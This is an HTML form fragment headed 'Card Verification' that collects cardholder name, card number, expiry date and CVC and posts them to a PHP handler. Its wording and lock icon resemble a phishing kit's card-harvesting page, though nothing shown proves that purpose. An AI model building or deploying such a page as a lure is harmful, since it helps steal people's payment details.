    <form onsubmit="myFunction()" action="/details/handler.php" method="post">

      <h3><i class="material-icons">lock</i>Card Verification </h3>

      <h4><i class="material-icons">credit_card</i>Verify your card details:</h4>

      <div id="names">

          <label>Cardholder Name:</label>

          <input class="form-control" style="text-transform: capitalize;"type="text" maxlength="22" placeholder="Mrs Jordan Smith" name="names" />

      </div>

      <div id="cc">

        <label>Number Card: <span class="pull-right card-type"></span></label>

        <input class="form-control" type="tel" maxlength="19" placeholder="1111 2222 3333 4444" name="creditcard" />

      </div>

      <div class="flexrow">

        <div id="date">

          <label>Expiration Date:</label>

          <div class="flexrow flow-left">

            <select class="form-control" style ="color: #b0b0b0;" name="month">

              <option>12</option>

            </select> <select class="form-control" style ="color: #b0b0b0;" name="year">

              <option>2020</option>

            </select>

          </div>

        </div>

        <div id="csv">

          <label>CVC:</label>

          <div class="flexrow flow-right">

            <input type="tel" class="form-control" maxlength="3" name="cvc" autocomplete="no" placeholder="XXX" />

          </div>

        </div>

      </div>

      <div class="flexrow flow-right buttonrow">

        <button class="verify" disabled="disabled">confirm</button>

      </div>

    </form>
